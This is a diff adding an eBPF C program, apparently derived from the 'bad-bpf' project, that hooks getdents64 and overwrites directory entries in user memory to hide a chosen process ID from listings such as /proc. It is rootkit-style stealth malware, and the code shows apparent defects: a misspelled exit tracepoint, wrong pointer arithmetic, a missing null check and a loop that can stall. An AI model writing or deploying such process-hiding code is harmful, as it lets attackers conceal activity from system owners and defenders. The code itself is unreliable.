@@ -1,0 +1,129 @@
+/*
+ *  Credit for inspiration goes to github.com/pathtofile, see pathtofile/bad-bpf
+ */
+
+//TODO add list of files to block, and a map to store them in
+
+
+#include "vmlinux.h"
+#include "hide.h"
+
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+#include <bpf/bpf_core_read.h>
+
+
+char LICENSE[] SEC("license") = "GPL";
+
+//map for dirents
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 8192);
+    __type(key, u64);
+    __type(value, u64);
+} map_dirent_bufs SEC(".maps");
+
+
+//hook getdents64 to store PID and dirents buffer address of caller
+SEC("tracepoint/syscalls/sys_enter_getdents64")
+int BPF_getdents64_enter(struct trace_event_raw_sys_enter * arg) {
+
+    //get pid & tgid, stored in same 64bit int
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+
+    //get miscellaneous
+    s32 fd = arg->args[0];
+    u64 count = arg->args[2];
+
+    //get dirent buffer
+    struct linux_dirent64 * direntp = (struct linux_dirent64 *) arg->args[1];
+    bpf_map_update_elem(&map_dirent_bufs, (void *) &pid_tgid, 
+                        (void *) &direntp, BPF_ANY);
+    return 0;
+}
+
+
+//check return dirents buffer for entry matching PID to block
+SEC("tracepoint/syscalls/sys_exit_getents64")
+int BPF_getdents64_exit(struct trace_event_raw_sys_exit * arg) {
+
+    //get pid & tgid, stored in same 64bit int
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+
+    //get bytes read during syscall
+    u64 r_bytes = arg->ret;
+    if (r_bytes == 0) return 0;
+
+    //check if the buffer for this PID is known
+    u64 * bufp = bpf_map_lookup_elem(&map_dirent_bufs, &pid_tgid);
+    if (*bufp == NULL) return 0;
+
+    //setup scanning dirent buffers
+    struct linux_dirent64 * direntp;
+    struct linux_dirent64 * direntp_last;
+
+    //setup dirent lengths
+    u16 d_reclen = 0;
+    u16 d_reclen_last = 0;
+    u16 d_reclen_new = 0;
+
+    //setup dirent buffer offsets
+    u32 buf_offset = 0;
+    u32 buf_offset_last = 0;
+
+    //setup misc
+    char filename[PID_LEN_MAX];
+    //s32 pid = pid_tgid >> 32;
+    
+    
+    //NOTE: loop has to be finite to satisfy eBPF verifier
+    //iterate through all structurs in the return buffer looking for the pid
+    for (int i = 0; i < 8192; ++i) {
+       
+        //if trying to read past end of buffer, exit loop
+        if (buf_offset >= r_bytes) {
+            break;
+        }
+
+        //get next dirent & extract its size and name from userspace
+        direntp = (struct linux_dirent64 *) (bufp + buf_offset);
+        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &direntp->d_reclen);
+        bpf_probe_read_user(&filename, hidden_pid_len, direntp->d_name);
+
+        //string compare
+        int j = 0;
+        for (j = 0; j < hidden_pid_len; ++j) {
+            if (filename[j] != hidden_pid[j]) break;
+        } //end for each char
+     
+        //if match found
+        if (j == hidden_pid_len) {
+
+            //if this is the first dirent in directory, can't hide it so skip
+            if (buf_offset == 0) continue;
+            
+            //get previous dirent
+            direntp_last = (struct linux_dirent64 *) (bufp + buf_offset_last);
+            bpf_probe_read_user(&d_reclen_last, sizeof(d_reclen_last), 
+                                &direntp_last->d_reclen);
+
+            //make last dirent overwrite current dirent to hide this entry
+            d_reclen_new = d_reclen_last + d_reclen;
+            bpf_probe_write_user(&direntp_last->d_reclen, &d_reclen_new,
+                                 sizeof(d_reclen_new));
+
+            //remove dirent entry from the map
+            bpf_map_delete_elem(&map_dirent_bufs, &pid_tgid);
+        }
+        
+        buf_offset_last = buf_offset;
+        buf_offset += d_reclen;
+    
+    } //end for each dirent
+
+    //clean up entries for this pid_tgid since ebpf is exiting
+    bpf_map_delete_elem(&map_dirent_bufs, &pid_tgid);
+
+    return 0;
+
+}
